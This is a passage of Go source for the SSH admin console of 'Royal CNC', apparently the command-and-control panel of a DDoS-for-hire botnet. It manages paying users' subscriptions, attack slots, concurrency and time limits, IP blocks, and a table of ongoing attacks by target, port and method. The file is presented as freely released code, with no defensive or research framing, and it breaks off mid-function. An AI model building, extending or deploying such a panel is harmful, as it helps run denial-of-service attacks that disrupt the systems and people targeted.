package main

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"github.com/gliderlabs/ssh"
	"github.com/iskaa02/qalam/gradient"
	"github.com/mattn/go-shellwords"
	"github.com/olekukonko/tablewriter"
	"golang.org/x/crypto/ssh/terminal"
)

type Admin struct {
	conn ssh.Session
}

var onlineUsers int32
var onlineUsernames []string

// map username: ssh
var onlineSessions = make(map[string]ssh.Session)

func NewAdmin(ssh ssh.Session) *Admin {
	atomic.AddInt32(&onlineUsers, 1)
	//check if user is already online, and ask if he want to disconnect the other session, if not, disconnect the current session
	for _, username := range onlineUsernames {
		if username == ssh.User() {
			terminal := terminal.NewTerminal(ssh, "")
			otherSession := onlineSessions[username]
			ssh.Write([]byte("Royal CNC : You are already connected. \nDo you want to disconnect the other session? [y/n]: "))
			answer, err := terminal.ReadLine()
			if err != nil {
				log.Println(err)
				return nil
			}
			if strings.ToLower(answer) == "y" {
				otherSession.Close()
				onlineSessions[ssh.User()] = ssh
				break
			} else {
				ssh.Close()
				return &Admin{nil}
			}
		}
	}
	onlineSessions[ssh.User()] = ssh
	onlineUsernames = append(onlineUsernames, ssh.User())
	go func() {
		<-ssh.Context().Done()
		atomic.AddInt32(&onlineUsers, -1)
		for i, username := range onlineUsernames {
			if username == ssh.User() {
				onlineUsernames = append(onlineUsernames[:i], onlineUsernames[i+1:]...)
				break
			}
		}
	}()

	return &Admin{ssh}
}

func readBlacklistedIPs(filename string) []string {
	blacklistedIPs := []string{}
	file, err := os.Open(filename)
	if err != nil {
		return blacklistedIPs
	}
	defer file.Close()
	decoder := json.NewDecoder(file)
	err = decoder.Decode(&blacklistedIPs)
	if err != nil {
		return blacklistedIPs
	}
	return blacklistedIPs
}

func editBlacklisterIPs(filename string, blacklistedIPs []string) {
	file, err := os.Create(filename)
	if err != nil {
		return
	}
	defer file.Close()
	encoder := json.NewEncoder(file)
	err = encoder.Encode(blacklistedIPs)
	if err != nil {
		return
	}
}

func (this *Admin) Handle() {
	if this.conn == nil {
		onlineUsers--
		return
	}
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()
	this.conn.Write([]byte("\r\n\033[0m"))
	this.ClearScreen()
	welcome := ui("welcome", nil)
	this.SendMessage(welcome+"\u001B[0m", true)
	//this.SendMessage(g.Mutline(logo)+"\u001B[0m", true)
	this.conn.Write([]byte("\r\n\033[0m"))
	var userInfo AccountInfo
	userInfo = database.GetAccountInfo(this.conn.User())
	log.Println(userInfo)
	userIp := this.conn.RemoteAddr().String()
	database.AddLoginLogs(userInfo.username, userIp)
	database.updateIp(userInfo.username, userIp)
	go func() {
		everyMinRunning := true
		go func() {
			<-this.conn.Context().Done()
			everyMinRunning = false
		}()
		for everyMinRunning {
			time.Sleep(time.Minute)
			userInfo = database.GetAccountInfo(this.conn.User())
		}
	}()
	go func() {
		everySecRunning := true
		go func() {
			<-this.conn.Context().Done()
			everySecRunning = false
		}()
		for everySecRunning {
			time.Sleep(time.Second)
			expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.expiry)
			if err != nil {
				continue
			}

			var expiryString string

			loc, _ := time.LoadLocation("Europe/Warsaw")
			now := time.Now().In(loc)
			year, month, day := now.Date()
			hour, mins, sec := now.Clock()
			nowLocal := time.Date(year, month, day, hour, mins, sec, now.Nanosecond(), expiryTime.Location())
			timeUntilExpiry := expiryTime.Sub(nowLocal)

			if timeUntilExpiry > 365*24*time.Hour {
				expiryString = "Lifetime"
			} else if timeUntilExpiry > 24*time.Hour {
				days := int(timeUntilExpiry.Hours() / 24)
				expiryString = fmt.Sprintf("%d days", days)
			} else if timeUntilExpiry > time.Hour {
				hours := int(timeUntilExpiry.Hours())
				expiryString = fmt.Sprintf("%d hours", hours)
			} else if timeUntilExpiry > time.Minute {
				minutes := int(timeUntilExpiry.Minutes())
				expiryString = fmt.Sprintf("%d minutes", minutes)
			} else if timeUntilExpiry > time.Second {
				seconds := int(timeUntilExpiry.Seconds())
				expiryString = fmt.Sprintf("%d seconds", seconds)
			} else if timeUntilExpiry <= 0 {
				expiryString = "Expired"
			}

			slotsInUse := database.getCurrentAttacksLength()

			name := config("name")
			slots := config("slots")
			title := ui("title", map[string]string{
				"name":       name,
				"username":   userInfo.username,
				"expiry":     expiryString,
				"totalslots": slots,
				"usedslots":  strconv.Itoa(slotsInUse),
				"online":     strconv.Itoa(int(onlineUsers)),
			})
			this.SetTitle(title)
		}
	}()
	commandsWithDescription := map[string]string{
		"help":     "Display this help message",
		"methods":  "Display the available attack methods",
		"ongoing":  "Display ongoing attacks",
		"clear":    "Clear the screen",
		"credits":  "view creator",
		"passwd":   "Change your password",
		"userinfo": "Display your account information",
		"exit":     "Exit the terminal",
	}
	commandsAdminWithDescription := map[string]string{
		"adddays [username] [days]":   "Add days to a user",
		"adddays [days]":              "Add days to everyone",
		"block [ip]":                  "Block an IP",
		"unblock [ip]":                "Unblock an IP",
		"blocked":                     "Display blocked IPs",
		"vip [username] [days]":       "Add VIP to a user",
		"editname [name] [newuser]":   "Change the name of the user",
		"editpass [name] [newpass]":   "Change the password of the user",
		"online":                      "Display online users",
		"unvip [username]":            "Remove VIP from a user",
		"private [username] [days]":   "Add PRIVATE to a user",
		"unprivate [username]":        "Remove PRIVATE from a user",
		"cooldown [username] [value]": "Change the cooldown of a user",
		"maxtime [username] [value]":  "Change the maxtime of a user",
		"conc [username] [value]":     "Change the concurrents of a user",
		"users":                       "Display all users",
		"users [add/delete/expiry]":   "Manage users",
	}
	term := terminal.NewTerminal(this.conn, "")
	for {
		name := config("name")
		termText := ui("prompt", map[string]string{
			"name":     name,
			"username": userInfo.username,
		})
		//term := terminal.NewTerminal(this.conn, g.Mutline(userInfo.username+"@leviathan:~$ "))
		this.SendMessage(termText, false)
		cmd, err := term.ReadLine()
		cmd = strings.ToLower(cmd)
		args, _ := shellwords.Parse(cmd)
		if err != nil {
			return
		}
		this.conn.Write([]byte("\033[2J\033[1;1H"))
		//if cmd is empty, continue
		if cmd == "" || len(args) == 0 {
			continue
		}

		if cmd == "methods" || cmd == "METHODS" || cmd == "METHOD" || cmd == "method" {
			generateMethods := config("generatemethods")
			message := ""
			if generateMethods == "true" {
				message = DisplayMethods()
			} else {
				message = ui("methods", nil)
			}
			this.SendMessage(message, true)
			continue
		}

		if args[0] == "adddays" || args[0] == "ADDDAYS" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 2 && len(args) != 3 {
				this.SendMessage("\u001B[91mUsage: adddays [username] [days]/Usage: adddays [days]\u001B[0m", true)
				continue
			}
			if len(args) == 2 {
				days, err := strconv.Atoi(args[1])
				if err != nil {
					this.SendMessage("\u001B[91mInvalid length.\u001B[0m", true)
					continue
				}
				send := database.AddDaysEveryone(days)
				if send == false {
					this.SendMessage("\u001B[91mError adding days.\u001B[0m", true)
					continue
				}
				this.SendMessage("\u001B[92mDays added successfully.\u001B[0m", true)
				continue
			} else if len(args) == 3 {
				days, err := strconv.Atoi(args[2])
				if err != nil {
					this.SendMessage("\u001B[91mInvalid length.\u001B[0m", true)
					continue
				}
				send := database.AddDays(args[1], days)
				if send == false {
					this.SendMessage("\u001B[91mError adding days.\u001B[0m", true)
					continue
				}
				this.SendMessage("\u001B[92mDays added successfully.\u001B[0m", true)
				continue
			}
			continue
		}

		if args[0] == "editname" || args[0] == "EDITNAME" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 3 {
				this.SendMessage("\u001B[91mUsage: editname [name] [newuser]\u001B[0m", true)
				continue
			}
			send := database.ChangeUserUsername(args[1], args[2])
			if send == false {
				this.SendMessage("\u001B[91mError changing username.\u001B[0m", true)
				continue
			}
			this.SendMessage("\u001B[92mUsername changed successfully.\u001B[0m", true)
			continue
		}

		if args[0] == "editpass" || args[0] == "EDITPASS" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 3 {
				this.SendMessage("\u001B[91mUsage: editpass [name] [newpass]\u001B[0m", true)
				continue
			}
			send := database.ChangeUserPass(args[1], args[2])
			if send == false {
				this.SendMessage("\u001B[91mError changing password.\u001B[0m", true)
				continue
			}
			this.SendMessage("\u001B[92mPassword changed successfully.\u001B[0m", true)
			continue
		}

		if cmd == "online" || cmd == "ONLINE" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			var builder strings.Builder
			builder.WriteString("\u001B[92mOnline Users:\n")
			for _, username := range onlineUsernames {
				builder.WriteString(username + "\n")
			}
			this.SendMessage(builder.String()+"\u001B[0m", true)
			continue
		}
		if cmd == "credits" || cmd == "credit" {
			var builder strings.Builder
			builder.WriteString("\u001B[38;5;255mRoyal CNC Free Version is a custom written source\nwith less than 2,100 lines of code.\n")
			builder.WriteString("\u001B[38;5;255mThis Src was developed solely by https://t.me/Royaloakap\n\n")
			builder.WriteString("\u001B[38;5;255mThank you for use My CNC FREE \u001B[38;5;196m♥ \u001B[38;5;255mt.me/RoyalSRC\n")
		
			message := builder.String()
			this.SendMessage(message+"\u001B[0m", true)
			continue
		}
		
		

		if args[0] == "block" || args[0] == "BLOCK" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 2 {
				this.SendMessage("\u001B[91mUsage: block [ip]\u001B[0m", true)
				continue
			}
			//open file blacklistedIPs.json, its array in json. append the ip to the array and save it
			filename := "blacklistedIPs.json"
			blacklistedIPs := readBlacklistedIPs(filename)
			blacklistedIPs = append(blacklistedIPs, args[1])
			editBlacklisterIPs(filename, blacklistedIPs)
			this.SendMessage("\u001B[92mIP blocked successfully.\u001B[0m", true)
			continue
		}

		if args[0] == "unblock" || args[0] == "UNBLOCK" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 2 {
				this.SendMessage("\u001B[91mUsage: unblock [ip]\u001B[0m", true)
				continue
			}
			filename := "blacklistedIPs.json"
			blacklistedIPs := readBlacklistedIPs(filename)
			for i, ip := range blacklistedIPs {
				if ip == args[1] {
					blacklistedIPs = append(blacklistedIPs[:i], blacklistedIPs[i+1:]...)
					break
				}
			}
			editBlacklisterIPs(filename, blacklistedIPs)
			this.SendMessage("\u001B[92mIP unblocked successfully.\u001B[0m", true)
			continue
		}

		if args[0] == "blocked" || args[0] == "BLOCKED" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			blocked := readBlacklistedIPs("blacklistedIPs.json")
			if len(blocked) == 0 {
				this.SendMessage("\u001B[91mNo blocked IPs found.\u001B[0m", true)
				continue
			}
			builder := &strings.Builder{}
			var data [][]string
			data = append(data, []string{""})
			for _, ip := range blocked {
				data = append(data, []string{ip})
			}
			table := tablewriter.NewWriter(builder)
			table.SetHeader([]string{"IP"})
			table.SetAutoWrapText(false)
			table.SetAutoFormatHeaders(true)
			table.SetHeaderAlignment(tablewriter.ALIGN_LEFT)
			table.SetAlignment(tablewriter.ALIGN_LEFT)
			table.SetCenterSeparator("")
			table.SetColumnSeparator("")
			table.SetRowSeparator("")
			table.SetHeaderLine(false)
			table.SetBorder(false)
			table.SetTablePadding("\t") // pad with tabs
			table.SetNoWhiteSpace(true)
			table.AppendBulk(data) // Add Bulk Data
			table.Render()
			b, _ := gradient.NewGradient("#FFBE0B", "#F42B03")
			this.SendMessage("\n"+b.Mutline(builder.String())+"\u001B[0m", true)
			continue
		}

		if args[0] == "passwd" || args[0] == "changepassword" || args[0] == "PASSWD" || args[0] == "CHANGEPASSWORD" {
			if len(args) != 3 {
				this.SendMessage("\u001B[91mUsage: passwd [newpassword] [retype newpassword]\u001B[0m", true)
				continue
			}
			if args[1] != args[2] {
				this.SendMessage("\u001B[91mPasswords do not match.\u001B[0m", true)
				continue
			}
			err := database.ChangePassword(userInfo.username, args[1])
			if err != nil {
				this.SendMessage("\u001B[91mError changing password.\u001B[0m", true)
			} else {
				this.SendMessage("\u001B[92mPassword changed successfully.\u001B[0m", true)
			}
			continue
		}

		if args[0] == "userinfo" || args[0] == "USERINFO" || args[0] == "PLAN" || args[0] == "plan" {
			userMembership := "User"
			userInfo = database.GetAccountInfo(this.conn.User())
			if userInfo.membership == 1 {
				userMembership = "Admin"
			}
			expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.expiry)
			if err != nil {
				log.Println(err)
				continue
			}

			var expiryString string

			loc, _ := time.LoadLocation("Europe/Warsaw")
			now := time.Now().In(loc)
			year, month, day := now.Date()
			hour, mins, sec := now.Clock()
			nowLocal := time.Date(year, month, day, hour, mins, sec, now.Nanosecond(), expiryTime.Location())
			timeUntilExpiry := expiryTime.Sub(nowLocal)

			if timeUntilExpiry > 365*24*time.Hour {
				expiryString = "Lifetime"
			} else if timeUntilExpiry > 24*time.Hour {
				days := int(timeUntilExpiry.Hours() / 24)
				expiryString = fmt.Sprintf("%d days", days)
			} else if timeUntilExpiry > time.Hour {
				hours := int(timeUntilExpiry.Hours())
				expiryString = fmt.Sprintf("%d hours", hours)
			} else if timeUntilExpiry > time.Minute {
				minutes := int(timeUntilExpiry.Minutes())
				expiryString = fmt.Sprintf("%d minutes", minutes)
			} else if timeUntilExpiry > time.Second {
				seconds := int(timeUntilExpiry.Seconds())
				expiryString = fmt.Sprintf("%d seconds", seconds)
			} else if timeUntilExpiry <= 0 {
				expiryString = "Expired"
			}

			vipTime, err := time.Parse("2006-01-02 15:04:05", userInfo.vip)
			if err != nil {
				continue
			}

			privateTime, err := time.Parse("2006-01-02 15:04:05", userInfo.private)
			if err != nil {
				continue
			}

			var vipExpiryString string

			now = time.Now().In(loc)
			year, month, day = now.Date()
			hour, mins, sec = now.Clock()
			nowLocal = time.Date(year, month, day, hour, mins, sec, now.Nanosecond(), vipTime.Location())
			timeUntilVipExpiry := vipTime.Sub(nowLocal)

			if timeUntilVipExpiry > 365*24*time.Hour {
				vipExpiryString = "Lifetime"
			} else if timeUntilVipExpiry > 24*time.Hour {
				vipExpiryString = fmt.Sprintf("%d days", int(timeUntilVipExpiry.Hours()/24))
			} else if timeUntilVipExpiry > time.Hour {
				vipExpiryString = fmt.Sprintf("%d hours", int(timeUntilVipExpiry.Hours()))
			} else if timeUntilVipExpiry > time.Minute {
				vipExpiryString = fmt.Sprintf("%d minutes", int(timeUntilVipExpiry.Minutes()))
			} else if timeUntilVipExpiry > time.Second {
				vipExpiryString = fmt.Sprintf("%d seconds", int(timeUntilVipExpiry.Seconds()))
			} else if timeUntilVipExpiry <= 0 {
				vipExpiryString = "Expired"
			}

			var privateExpiryString string

			timeUntilPrivateExpiry := privateTime.Sub(nowLocal)

			if timeUntilPrivateExpiry > 365*24*time.Hour {
				privateExpiryString = "Lifetime"
			} else if timeUntilPrivateExpiry > 24*time.Hour {
				privateExpiryString = fmt.Sprintf("%d days", int(timeUntilPrivateExpiry.Hours()/24))
			} else if timeUntilPrivateExpiry > time.Hour {
				privateExpiryString = fmt.Sprintf("%d hours", int(timeUntilPrivateExpiry.Hours()))
			} else if timeUntilPrivateExpiry > time.Minute {
				privateExpiryString = fmt.Sprintf("%d minutes", int(timeUntilPrivateExpiry.Minutes()))
			} else if timeUntilPrivateExpiry > time.Second {
				privateExpiryString = fmt.Sprintf("%d seconds", int(timeUntilPrivateExpiry.Seconds()))
			} else if timeUntilPrivateExpiry <= 0 {
				privateExpiryString = "Expired"
			}
			accountDetails := ui("plan", map[string]string{
				"username":    userInfo.username,
				"membership":  userMembership,
				"expiry":      expiryString,
				"vip":         vipExpiryString,
				"private":     privateExpiryString,
				"cooldown":    strconv.Itoa(userInfo.cooldown),
				"concurrents": strconv.Itoa(userInfo.concurrents),
				"maxtime":     strconv.Itoa(userInfo.maxtime),
			})

			this.SendMessage(accountDetails+"\u001B[0m", true)
			continue
		}

		if args[0] == "vip" || args[0] == "VIP" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 3 {
				this.SendMessage("\u001B[91mUsage: vip [username] [length in days]\u001B[0m", true)
				continue
			}
			expiry, err := strconv.Atoi(args[2])
			if err != nil {
				this.SendMessage("\u001B[91mInvalid length.\u001B[0m", true)
				continue
			}
			send := database.VipUser(args[1], expiry)
			if send == false {
				this.SendMessage("\u001B[91mError adding VIP.\u001B[0m", true)
				continue
			}
			this.SendMessage("\u001B[92mVIP added successfully.\u001B[0m", true)
			continue
		}

		if args[0] == "cooldown" || args[0] == "COOLDOWN" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 3 {
				this.SendMessage("\u001B[91mUsage: cooldown [username] [value]\u001B[0m", true)
				continue
			}
			cooldown, err := strconv.Atoi(args[2])
			if err != nil {
				this.SendMessage("\u001B[91mInvalid length.\u001B[0m", true)
				continue
			}
			send := database.ChangeCooldown(args[1], cooldown)
			if send == false {
				this.SendMessage("\u001B[91mError adding cooldown.\u001B[0m", true)
				continue
			}
			this.SendMessage("\u001B[92mCOOLDOWN updated successfully.\u001B[0m", true)
			continue
		}

		if args[0] == "conc" || args[0] == "CONC" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 3 {
				this.SendMessage("\u001B[91mUsage: conc [username] [value]\u001B[0m", true)
				continue
			}
			concurrents, err := strconv.Atoi(args[2])
			if err != nil {
				this.SendMessage("\u001B[91mInvalid length.\u001B[0m", true)
				continue
			}
			send := database.ChangeConcurrents(args[1], concurrents)
			if send == false {
				this.SendMessage("\u001B[91mError adding concurrents.\u001B[0m", true)
				continue
			}
			this.SendMessage("\u001B[92mCONCURRENTS updated successfully.\u001B[0m", true)
			continue
		}

		if args[0] == "maxtime" || args[0] == "MAXTIME" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 3 {
				this.SendMessage("\u001B[91mUsage: maxtime [username] [value]\u001B[0m", true)
				continue
			}
			maxtime, err := strconv.Atoi(args[2])
			if err != nil {
				this.SendMessage("\u001B[91mInvalid length.\u001B[0m", true)
				continue
			}
			send := database.ChangeMaxtime(args[1], maxtime)
			if send == false {
				this.SendMessage("\u001B[91mError adding maxtime.\u001B[0m", true)
				continue
			}
			this.SendMessage("\u001B[92mMAXTIME updated successfully.\u001B[0m", true)
			continue
		}

		if args[0] == "private" || args[0] == "PRIVATE" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 3 {
				this.SendMessage("\u001B[91mUsage: private [username] [length in days]\u001B[0m", true)
				continue
			}
			expiry, err := strconv.Atoi(args[2])
			if err != nil {
				this.SendMessage("\u001B[91mInvalid length.\u001B[0m", true)
				continue
			}
			send := database.PrivateUser(args[1], expiry)
			if send == false {
				this.SendMessage("\u001B[91mError adding PRIVATE.\u001B[0m", true)
				continue
			}
			this.SendMessage("\u001B[92mPRIVATE added successfully.\u001B[0m", true)
			continue
		}

		if args[0] == "unvip" || args[0] == "UNVIP" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 2 {
				this.SendMessage("\u001B[91mUsage: unvip [username]\u001B[0m", true)
				continue
			}
			send := database.RemoveVip(args[1])
			if send == false {
				this.SendMessage("\u001B[91mError removing VIP.\u001B[0m", true)
				continue
			}
			this.SendMessage("\u001B[92mVIP removed successfully.\u001B[0m", true)
			continue
		}

		if args[0] == "unprivate" || args[0] == "UNPRIVATE" {
			if userInfo.membership != 1 {
				this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
				continue
			}
			if len(args) != 2 {
				this.SendMessage("\u001B[91mUsage: unprivate [username]\u001B[0m", true)
				continue
			}
			send := database.RemovePrivate(args[1])
			if send == false {
				this.SendMessage("\u001B[91mError removing PRIVATE.\u001B[0m", true)
				continue
			}
			this.SendMessage("\u001B[92mPRIVATE removed successfully.\u001B[0m", true)
			continue
		}

		if args[0] == "users" || args[0] == "USERS" {
			if len(args) == 1 {
				if userInfo.membership != 1 {
					this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
					continue
				}

				users, usersCount := database.GetUsers(1)
				if len(users) == 0 {
					this.SendMessage("\u001B[91mNo users found.\u001B[0m", true)
					continue
				}
				var builder strings.Builder
				// username, password, membership, expiry
				fmt.Fprintf(&builder, "%-15s | %-10s | %-20s | %-20s | %-15s\n", "Username", "Membership", "Expiry", "Vip", "IP")
				fmt.Fprintf(&builder, "%-15s%-10s%-20s%-20s%-15s\n", strings.Repeat("-", 15), strings.Repeat("-", 10), strings.Repeat("-", 20), strings.Repeat("-", 20), strings.Repeat("-", 15))
				for _, user := range users {
					expiryTime, err := time.Parse("2006-01-02 15:04:05", user.expiry)
					if err != nil {
						continue
					}

					var expiryString string

					loc, _ := time.LoadLocation("Europe/Warsaw")
					now := time.Now().In(loc)
					year, month, day := now.Date()
					hour, mins, sec := now.Clock()
					nowLocal := time.Date(year, month, day, hour, mins, sec, now.Nanosecond(), expiryTime.Location())
					timeUntilExpiry := expiryTime.Sub(nowLocal)

					if timeUntilExpiry > 365*24*time.Hour {
						expiryString = "Lifetime"
					} else if timeUntilExpiry > 24*time.Hour {
						days := int(timeUntilExpiry.Hours() / 24)
						expiryString = fmt.Sprintf("%d days", days)
					} else if timeUntilExpiry > time.Hour {
						hours := int(timeUntilExpiry.Hours())
						expiryString = fmt.Sprintf("%d hours", hours)
					} else if timeUntilExpiry > time.Minute {
						minutes := int(timeUntilExpiry.Minutes())
						expiryString = fmt.Sprintf("%d minutes", minutes)
					} else if timeUntilExpiry > time.Second {
						seconds := int(timeUntilExpiry.Seconds())
						expiryString = fmt.Sprintf("%d seconds", seconds)
					} else if timeUntilExpiry <= 0 {
						expiryString = "Expired"
					}

					vipTime, err := time.Parse("2006-01-02 15:04:05", user.vip)
					if err != nil {
						continue
					}

					var vipExpiryString string

					now = time.Now().In(loc)
					year, month, day = now.Date()
					hour, mins, sec = now.Clock()
					nowLocal = time.Date(year, month, day, hour, mins, sec, now.Nanosecond(), vipTime.Location())
					timeUntilVipExpiry := vipTime.Sub(nowLocal)

					if timeUntilVipExpiry > 365*24*time.Hour {
						vipExpiryString = "Lifetime"
					} else if timeUntilVipExpiry > 24*time.Hour {
						vipExpiryString = fmt.Sprintf("%d days", int(timeUntilVipExpiry.Hours()/24))
					} else if timeUntilVipExpiry > time.Hour {
						vipExpiryString = fmt.Sprintf("%d hours", int(timeUntilVipExpiry.Hours()))
					} else if timeUntilVipExpiry > time.Minute {
						vipExpiryString = fmt.Sprintf("%d minutes", int(timeUntilVipExpiry.Minutes()))
					} else if timeUntilVipExpiry > time.Second {
						vipExpiryString = fmt.Sprintf("%d seconds", int(timeUntilVipExpiry.Seconds()))
					} else if timeUntilVipExpiry <= 0 {
						vipExpiryString = "Expired"
					}

					fmt.Fprintf(&builder, "%-15s | %-10d | %-20s | %-20s | %-15s\n", user.username, user.membership, expiryString, vipExpiryString, user.ip)
				}
				fmt.Fprintf(&builder, "\nPage 1 of %d\n", usersCount)
				this.SendMessage(builder.String()+"\u001B[0m", true)
				continue
			} else if page, err := strconv.Atoi(args[1]); err == nil {
				if userInfo.membership != 1 {
					this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
					continue
				}

				if page == 0 {
					page = 1
				}

				users, usersCount := database.GetUsers(page)
				if users == nil {
					this.SendMessage("\u001B[91mNo page found.\u001B[0m", true)
					continue
				}
				var builder strings.Builder
				// username, password, membership, expiry
				fmt.Fprintf(&builder, "%-15s | %-10s | %-20s | %-20s | %-15s\n", "Username", "Membership", "Expiry", "Vip", "IP")
				fmt.Fprintf(&builder, "%-15s%-10s%-20s%-20s%-15s\n", strings.Repeat("-", 15), strings.Repeat("-", 10), strings.Repeat("-", 20), strings.Repeat("-", 20), strings.Repeat("-", 15))
				for _, user := range users {
					expiryTime, err := time.Parse("2006-01-02 15:04:05", user.expiry)
					if err != nil {
						continue
					}

					var expiryString string

					loc, _ := time.LoadLocation("Europe/Warsaw")
					now := time.Now().In(loc)
					year, month, day := now.Date()
					hour, mins, sec := now.Clock()
					nowLocal := time.Date(year, month, day, hour, mins, sec, now.Nanosecond(), expiryTime.Location())
					timeUntilExpiry := expiryTime.Sub(nowLocal)

					if timeUntilExpiry > 365*24*time.Hour {
						expiryString = "Lifetime"
					} else if timeUntilExpiry > 24*time.Hour {
						days := int(timeUntilExpiry.Hours() / 24)
						expiryString = fmt.Sprintf("%d days", days)
					} else if timeUntilExpiry > time.Hour {
						hours := int(timeUntilExpiry.Hours())
						expiryString = fmt.Sprintf("%d hours", hours)
					} else if timeUntilExpiry > time.Minute {
						minutes := int(timeUntilExpiry.Minutes())
						expiryString = fmt.Sprintf("%d minutes", minutes)
					} else if timeUntilExpiry > time.Second {
						seconds := int(timeUntilExpiry.Seconds())
						expiryString = fmt.Sprintf("%d seconds", seconds)
					} else if timeUntilExpiry <= 0 {
						expiryString = "Expired"
					}

					vipTime, err := time.Parse("2006-01-02 15:04:05", user.vip)
					if err != nil {
						continue
					}

					var vipExpiryString string

					now = time.Now().In(loc)
					year, month, day = now.Date()
					hour, mins, sec = now.Clock()
					nowLocal = time.Date(year, month, day, hour, mins, sec, now.Nanosecond(), vipTime.Location())
					timeUntilVipExpiry := vipTime.Sub(nowLocal)

					if timeUntilVipExpiry > 365*24*time.Hour {
						vipExpiryString = "Lifetime"
					} else if timeUntilVipExpiry > 24*time.Hour {
						vipExpiryString = fmt.Sprintf("%d days", int(timeUntilVipExpiry.Hours()/24))
					} else if timeUntilVipExpiry > time.Hour {
						vipExpiryString = fmt.Sprintf("%d hours", int(timeUntilVipExpiry.Hours()))
					} else if timeUntilVipExpiry > time.Minute {
						vipExpiryString = fmt.Sprintf("%d minutes", int(timeUntilVipExpiry.Minutes()))
					} else if timeUntilVipExpiry > time.Second {
						vipExpiryString = fmt.Sprintf("%d seconds", int(timeUntilVipExpiry.Seconds()))
					} else if timeUntilVipExpiry <= 0 {
						vipExpiryString = "Expired"
					}

					fmt.Fprintf(&builder, "%-15s | %-10d | %-20s | %-20s | %-15s\n", user.username, user.membership, expiryString, vipExpiryString, user.ip)
				}
				fmt.Fprintf(&builder, "\nPage %d of %d\n", page, usersCount)
				this.SendMessage(builder.String()+"\u001B[0m", true)
				continue
			} else {
				if args[1] == "add" || args[1] == "ADD" {
					if userInfo.membership != 1 {
						this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
						continue
					}
					if len(args) != 7 {
						this.SendMessage("\u001B[91mUsage: users add [username] [password] [admin (1/0)] [length] [type(h, d, m, y, lifetime)]\u001B[0m", true)
						continue
					}
					membership, err := strconv.Atoi(args[4])
					if err != nil {
						this.SendMessage("\u001B[91mInvalid membership.\u001B[0m", true)
						continue
					}
					expiry, err := strconv.Atoi(args[5])
					if err != nil {
						this.SendMessage("\u001B[91mInvalid length.\u001B[0m", true)
						continue
					}
					send := database.CreateNewUser(args[2], args[3], membership, strconv.Itoa(expiry), args[6], 60, 60)
					if send == false {
						this.SendMessage("\u001B[91mError adding user.\u001B[0m", true)
						continue
					}
					this.SendMessage("\u001B[92mUser added successfully.\u001B[0m", true)
					continue
				} else if args[1] == "delete" || args[1] == "DELETE" {
					if userInfo.membership != 1 {
						this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
						continue
					}
					if len(args) != 3 {
						this.SendMessage("\u001B[91mUsage: users delete [username]\u001B[0m", true)
						continue
					}
					database.DeleteUser(args[2])
					this.SendMessage("\u001B[92mUser deleted successfully.\u001B[0m", true)
					continue
				} else if args[1] == "expiry" || args[1] == "EXPIRY" {
					if userInfo.membership != 1 {
						this.SendMessage("\u001B[91mYou do not have permission to use this command.\u001B[0m", true)
						continue
					}
					if len(args) != 5 {
						this.SendMessage("\u001B[91mUsage: users expiry [username] [length] [type(h, d, m, y, lifetime)]\u001B[0m", true)
						continue
					}
					expiry, err := strconv.Atoi(args[3])
					if err != nil {
						this.SendMessage("\u001B[91mInvalid length.\u001B[0m", true)
						continue
					}
					send := database.ExpireUser(args[2], strconv.Itoa(expiry), args[4])
					if send == false {
						this.SendMessage("\u001B[91mError expiring user.\u001B[0m", true)
						continue
					}
					this.SendMessage("\u001B[92mUser expired successfully.\u001B[0m", true)
					continue
				} else {
					this.SendMessage("\u001B[91mUsage: users [add/delete/expiry/<number page>]\u001B[0m", true)
					continue
				}
			}
		}

		if cmd == "ongoing" || cmd == "ONGOING" {
			currentAttacks := database.getCurrentAttacks()
			if len(currentAttacks) == 0 {
				this.SendMessage("\u001B[91mNo ongoing attacks.\u001B[0m", true)
				continue
			}
			builder := &strings.Builder{}
			var data [][]string
			data = append(data, []string{"", ""})
			for _, attack := range currentAttacks {
				if userInfo.membership == 1 {
					data = append(data, []string{attack.username, attack.target, attack.port, strconv.Itoa(attack.duration), attack.method})
				} else {
					data = append(data, []string{"*****", attack.target, attack.port, strconv.Itoa(attack.duration), attack.method})
				}
			}
			table := tablewriter.NewWriter(builder)
